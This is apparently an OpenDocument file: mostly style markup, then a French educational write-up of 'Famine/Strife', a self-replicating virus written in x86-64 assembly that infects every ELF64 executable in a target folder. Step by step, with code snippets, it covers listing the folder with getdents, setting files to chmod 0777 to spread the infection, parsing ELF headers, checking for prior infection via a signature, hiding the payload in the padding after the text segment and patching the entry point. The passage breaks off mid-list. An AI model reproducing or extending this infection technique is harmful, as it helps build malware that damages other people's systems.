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CB10000386F5ECCE4D3.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000286A0000099E6164520A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004AD5000039784E2A275C.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000046CD000011FD4276E148.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004D1B00001E143A8C731C.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004C62000029C23B66FE3A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000467E00000BE49399DE0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New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P4"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color="#000000" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">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color="#000000" style:font-name="Courier New"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color="#000000" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>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color="#569cd6"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text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="bold" style:font-size-asian="11pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d4d4d4" style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#000000" style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="bold" style:font-size-asian="11pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#6a9955" style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:background-color="#111111">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#111111">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:background-color="#111111">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#dcdcaa" style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Footnote">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard"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33"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fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T4"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style:font-name="Courier New" fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt"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color="#d4d4d4"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#d4d4d4" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#d4d4d4" fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:color="#d4d4d4" style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:color="#569cd6"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:color="#569cd6" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:color="#569cd6" fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:color="#569cd6" style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:color="#6a9955"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:color="#6a9955" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:color="#6a9955" fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:color="#6a9955" style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:color="#6a9955" style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:color="#b5cea8"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:color="#b5cea8" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:color="#b5cea8" style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:font-style="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color="#000000"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties fo:color="#dcdcaa"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:color="#dcdcaa" fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties style:text-underline-style="none"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2 Project Famine</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">&gt;&gt;&gt; <text:span text:style-name="T1">INTRODUCTION</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Le but de ce projet était de créer un programme permettant d'infecter tous les fichiers binaires exécutables de type ELF64 dans un dossier spécifique, et d'y ajouter la "signature" (une simple chaîne de caractères) suivante :</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">Famine version 1.0 (c)oded by qroland</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Le comportement du fichier binaire originel ne doit pas changer, cependant, à son exécution, il doit lui-même exécuter le virus et infecter les fichiers binaires du dossier cible. L'idée est donc d'insérer un bout de code exécutable au fichier qui s'exécutera avant le comportement normal du binaire, répliquera le virus, avant de redonner le contrôle au programme sans modifier son comportement.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Si le fichier était déjà infecté, on l'ignore et on empêche une seconde infection.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Pour résumer, notre virus devra adopter le comportement suivant :</text:p>
      <text:p text:style-name="P2">&gt; Ouvrir le dossier cible.</text:p>
      <text:p text:style-name="P2">&gt; Itérer sur tous les fichiers ELF64.</text:p>
      <text:p text:style-name="P2">&gt; Pour chacun de ces fichiers ELF64, se copier lui-même dans une région mémoire exécutable.</text:p>
      <text:p text:style-name="P2">&gt; Modifier le point d'entrée du binaire pour que le virus s'exécute avant le programme.</text:p>
      <text:p text:style-name="P2">&gt; A la fin de l'exécution du virus, rediriger l'exécution du programme vers son point d'entrée originel.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">&gt;&gt;&gt; <text:span text:style-name="T1">EXPLICATIONS VIRUS – STRIFE</text:span></text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://unix.stackexchange.com/questions/89211/how-to-test-whether-a-linux-binary-was-compiled-as-position-independent-code" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"/></text:p>
      <text:p text:style-name="P6">#Introduction (virus setup)</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">La première chose que l'on fait dans le virus est de placer sur la stack une structure qui va contenir des données qu'on doit conserver au cours de l'exécution du virus, et qu'on ne peut conserver dans des registres.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">La structure se nomme 'famine', et on la définit dans un fichier <text:span text:style-name="T1">.inc </text:span><text:span text:style-name="T2">qui va en fait nous servir de fichier header dans le cadre d'une programmation en assembly pure.</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P4">%include "strife.inc"</text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://unix.stackexchange.com/questions/89211/how-to-test-whether-a-linux-binary-was-compiled-as-position-independent-code" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"/></text:p>
      <text:p text:style-name="P2">Ce fichier contient d'ailleurs d'autres <text:span text:style-name="T1">define</text:span><text:span text:style-name="T2"> qui vont se comporter exactement comme en C, en permettant de remplacer des expressions par des valeurs. </text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">Au niveau des structures, ce tutoriel </text:span><text:span text:style-name="T1">NASM</text:span><text:span text:style-name="T2"> résume bien les bases :</text:span></text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://www.nasm.us/xdoc/2.15/html/nasmdoc5.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T2">https://www.nasm.us/xdoc/2.15/html/nasmdoc5.html</text:span></text:a><text:span text:style-name="T2"> </text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">&gt; NASM définit le symbole </text:span><text:span text:style-name="T1">famine_size</text:span><text:span text:style-name="T2"> pour décrire la taille totale de la structure.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2">&gt; Les labels locaux de la structure peuvent être utilisés pour accéder aux </text:span><text:span text:style-name="T1">offsets</text:span><text:span text:style-name="T2"> des membres de la structure (famine.fsize par exemple).</text:span></text:p>
      <text:p text:style-name="P7">&gt; Lorsqu'on place notre structure sur la pile, on peut donc y accéder typiquement par :</text:p>
      <text:p text:style-name="P4">[ (rbp – famine_size) + famine.fsize ]</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><text:soft-page-break/>&gt; La macro suivante nous permet donc d'accéder directement aux membres de la structure :</text:p>
      <text:p text:style-name="P4">%define FAM(x)<text:tab/>[(rbp – famine_size) + x]</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">FAM(famine.map_ptr)<text:tab/><text:tab/>--&gt;</text:span><text:span text:style-name="T2"> Nous donne la valeur de famine.map_ptr</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">Une fois cette phase de setup effectuée, on charge l'adresse de la chaîne de caractères contenant le nom du dossier cible dans rdi, et on <text:span text:style-name="T1">call _traverse_dir</text:span>.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P19"><text:span text:style-name="T8">lea </text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">, [</text:span><text:span text:style-name="T12">rel</text:span><text:span text:style-name="T8"> target_1]</text:span></text:p>
      <text:p text:style-name="P23">call _traverse_dir</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://unix.stackexchange.com/questions/89211/how-to-test-whether-a-linux-binary-was-compiled-as-position-independent-code" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T2"/></text:a></text:p>
      <text:p text:style-name="P6"># Listing directories</text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://unix.stackexchange.com/questions/89211/how-to-test-whether-a-linux-binary-was-compiled-as-position-independent-code" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"/></text:p>
      <text:p text:style-name="P2">La boucle permettant d'itérer sur un dossier n'est pas très complexe. On commence par ouvrir le dossier avec un call classique à <text:span text:style-name="T1">open</text:span><text:span text:style-name="T2"> afin de récupérer un </text:span><text:span text:style-name="T1">fd </text:span><text:span text:style-name="T2">sur le dossier.</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">On effectue ensuite un appel au syscall <text:span text:style-name="T1">getdents</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P21"><text:span text:style-name="T9">mov </text:span><text:span text:style-name="T13">rdi</text:span><text:span text:style-name="T9">, </text:span><text:span text:style-name="T13">rax</text:span><text:span text:style-name="T9"> <text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T17">; rax has fd of directory</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">lea </text:span><text:span text:style-name="T12">rsi</text:span><text:span text:style-name="T8">, FAM(famine.dirents)<text:tab/></text:span><text:span text:style-name="T16">; Store dirents in 'famine' structure </text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rdx</text:span><text:span text:style-name="T8">, DIRENTS_BUFF_SIZE</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, SYS_GETENTS</text:span></text:p>
      <text:p text:style-name="P23">syscall</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">cmp </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T21">0</text:span></text:p>
      <text:p text:style-name="P23">jl .end_dir_loop</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">r15</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8"> <text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T16">; r15 keeps total size of dirents</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2">Ce syscall va lire les structures <text:span text:style-name="T1">linux_dirent </text:span><text:span text:style-name="T2">du dossier auquel appartient le </text:span><text:span text:style-name="T1">fd </text:span><text:span text:style-name="T2">qu'on lui fournit, et les stocker dans un buffer à l'adresse contenue dans </text:span><text:span text:style-name="T1">rsi </text:span><text:span text:style-name="T2">(dans notre structure 'famine'). Il renvoie la taille totale de ce qu'il a lu (on le stock dans r15).</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P2"><text:span text:style-name="T2">Voici la déclaration des structures </text:span><text:span text:style-name="T1">linux_dirent</text:span><text:span text:style-name="T2"> :</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P30"><text:s text:c="2"/>struct linux_dirent {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>unsigned long <text:s/>d_ino; <text:s text:c="4"/>/* Inode number */</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>unsigned long <text:s/>d_off; <text:s text:c="4"/>/* Offset to next <text:span text:style-name="T24">linux_dirent</text:span> */</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>unsigned short d_reclen; <text:s/>/* Length of this <text:span text:style-name="T24">linux_dirent</text:span> */</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>char <text:s text:c="10"/>d_name[]; <text:s/>/* Filename (null-terminated) */</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>char <text:s text:c="10"/>pad; <text:s text:c="6"/>// Zero padding byte</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>char <text:s text:c="10"/>d_type; <text:s text:c="3"/>// File type</text:p>
      <text:p text:style-name="P31"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P2">La boucle <text:span text:style-name="T1">.list_dir</text:span><text:span text:style-name="T2"> itère sur ces structures qui représentent les entrées du dossier. Tout est commenté dans le code, mais l'idée est simplement la suivante :</text:span></text:p>
      <text:p text:style-name="P7">&gt; On initialise un compteur total_dreclen à 0.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2">&gt; On se positionne au début de l'array de </text:span><text:span text:style-name="T1">dirents</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2">&gt; On lit la première structure. On place l'adresse du nom de fichier dans un registre, puis on examine le type du fichier. S'il s'agit d'une </text:span><text:span text:style-name="T25">regular file</text:span><text:span text:style-name="T27">, on la traite. Sinon, on passe.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T27">&gt; On ajoute le </text:span><text:span text:style-name="T28">dreclen </text:span><text:span text:style-name="T27">de la structure qu'on vient de lire à </text:span><text:span text:style-name="T28">total_dreclen</text:span><text:span text:style-name="T27">. Si la valeur est égale à la taille totale de ce qu'a lu le </text:span><text:span text:style-name="T28">syscall getdents</text:span><text:span text:style-name="T27">, on a lu toutes les entrées et on sort de la boucle.</text:span></text:p>
      <text:p text:style-name="P14">&gt; Sinon, on lit l'entrée suivante (en se plaçant au début de l'array de dirents et en ajoutant total_dreclen).</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">Cette boucle nous permet de parcourir toutes les entrées d'un fichier.</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:soft-page-break/></text:p>
      <text:p text:style-name="P15"># File infection</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">On commence par concaténer le nom du dossier et le nom du fichier, en bougeant simplement les bytes dans notre structure (famine.current_fpath).</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P6"><text:span text:style-name="T27">On effectue le </text:span><text:span text:style-name="T26">syscall </text:span><text:span text:style-name="T4">chmod(char *fname, 0777)</text:span><text:span text:style-name="T27">, nous permettant de nous assurer que notre utilisateur a les droits d'écriture et de lecture sur le fichier (lorsqu'il le peut en tout cas), et permettre à tout le monde d'exécuter notre fichier infecté afin de le diffuser au maximum.</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P6"><text:span text:style-name="T27">On </text:span><text:span text:style-name="T26">open </text:span><text:span text:style-name="T27">le fichier.</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P6"><text:span text:style-name="T27">On calcule la taille du fichier avec un </text:span><text:span text:style-name="T26">lseek</text:span><text:span text:style-name="T27"> (plus pratique qu'un </text:span><text:span text:style-name="T26">stat</text:span><text:span text:style-name="T27">). On récupère la taille du fichier, et on quitte si le fichier est trop petit pour être un ELF.</text:span></text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P22"><text:span text:style-name="T10">mov </text:span><text:span text:style-name="T14">rdi</text:span><text:span text:style-name="T10">, </text:span><text:span text:style-name="T14">rax</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">xor </text:span><text:span text:style-name="T12">rsi</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T12">rsi</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rdx</text:span><text:span text:style-name="T8">, SEEK_END</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, SYS_LSEEK</text:span></text:p>
      <text:p text:style-name="P23">syscall</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov FAM(famine.fsize), </text:span><text:span text:style-name="T12">rax</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov FAM(famine.mmap_size), </text:span><text:span text:style-name="T12">rax</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">cmp </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T21">4</text:span></text:p>
      <text:p text:style-name="P23">jl _end_file_infection</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">On effectue ensuite un </text:span><text:span text:style-name="T26">premier mmap</text:span><text:span text:style-name="T27"> du fichier ainsi ouvert. Cet mmap va nous permettre :</text:span></text:p>
      <text:p text:style-name="P10">&gt; De vérifier qu'il s'agit d'un fichier ELF.</text:p>
      <text:p text:style-name="P10">&gt; De vérifier que le format est x64.</text:p>
      <text:p text:style-name="P10">&gt; De vérifier qu'on a un fichier EXEC ou DYN.</text:p>
      <text:p text:style-name="P10">&gt; De récupérer les informations relatives au segment texte dans le fichier.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">La boucle permettant d'itérer sur les headers de segments est bien commentée dans le code, et plutôt claire.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">On se place au début du mapping du fichier ELF. On ajoute à l'adresse du mapping </text:span><text:span text:style-name="T4">elf64_ehdr.e_phoff</text:span><text:span text:style-name="T27">, et on stock la valeur à cette adresse qui représente l'offset des headers de segments. On fait de même pour récupérer </text:span><text:span text:style-name="T4">elf64_ehdr.e_phnum</text:span><text:span text:style-name="T27">. On se positionne ensuite au début des headers des segments, et on boucle jusqu'à atteindre le segment texte (PT_LOAD and executable) ou jusqu'à avoir épuisé les segments.</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">Une fois qu'on a trouvé le header correspondant au segment texte, on stock :</text:p>
      <text:p text:style-name="P10">&gt; Text segment header offset.</text:p>
      <text:p text:style-name="P10">&gt; p_offset.</text:p>
      <text:p text:style-name="P10">&gt; p_vaddr.</text:p>
      <text:p text:style-name="P10">&gt; p_filesz.</text:p>
      <text:p text:style-name="P10">&gt; Le gap par rapport au prochain segment.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">On vérifie si le fichier a déjà été infecté en comparant l'endroit où se trouverait la signature dans le fichier s'il avait été infecté, et la signature elle-même :</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P24"><text:span text:style-name="T10">mov </text:span><text:span text:style-name="T14">rdi</text:span><text:span text:style-name="T10">, FAM(famine.map_ptr)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">, FAM(famine.txt_offset)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">add </text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">, FAM(famine.txt_filesz)</text:span></text:p>
      <text:p text:style-name="P20"><text:soft-page-break/><text:span text:style-name="T8">sub </text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">, (_finish - signature)</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">mov </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, [</text:span><text:span text:style-name="T12">rel</text:span><text:span text:style-name="T8"> signature]</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T8">cmp </text:span><text:span text:style-name="T12">rax</text:span><text:span text:style-name="T8">, </text:span><text:span text:style-name="T12">qword</text:span><text:span text:style-name="T8"> [</text:span><text:span text:style-name="T12">rdi</text:span><text:span text:style-name="T8">]</text:span></text:p>
      <text:p text:style-name="P23">je _end_file_infection</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">Notons qu'on ne se place pas, dans le fichier, à :</text:p>
      <text:p text:style-name="P11">txt_offset + txt_filesz + VIRUS_SIZE</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">Mais à :</text:p>
      <text:p text:style-name="P11">txt_offset + txt_filesz</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">Car si le fichier a déjà été infecté, on aura déjà adapté le p_filesz du segment texte pour y ajouter la taille du virus, qui se terminera donc bien à </text:span><text:span text:style-name="T4">txt_offset + txt_filesz</text:span><text:span text:style-name="T27">. On a ensuite simplement à reculer jusqu'à la signature et comparer.</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8"><text:span text:style-name="T27">On en est maintenant à un point où l'on sait que le fichier a le bon format, et n'est pas infecté. On va donc chercher à y inscrire notre virus. On commence par </text:span><text:span text:style-name="T26">comparer la taille du virus et l'espace de padding disponible suite au segment texte</text:span><text:span text:style-name="T27">.</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">Si le virus peut être contenu dans cet espace, on va simplement l'y ajouter. Pour cela, on appelle une petite fonction qui va :</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T27">&gt; Augmenter </text:span><text:span text:style-name="T26">p_filesz </text:span><text:span text:style-name="T27">et </text:span><text:span text:style-name="T26">p_memsz </text:span><text:span text:style-name="T27">dans le header du segment texte (pas essentiel mais plus discret).</text:span></text:p>
      <text:p text:style-name="P10">&gt; Sauter directement à l'endroit du virus où on :</text:p>
      <text:list xml:id="list5615242556182591449" text:style-name="L1">
        <text:list-item>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P32">Patch l'entry point du fichier ELF pour le faire démarrer par le virus.</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P32">Copie l'intégralité du virus juste après la fin du segment texte originel.</text:p>
            </text:list-item>
            <text:list-item>
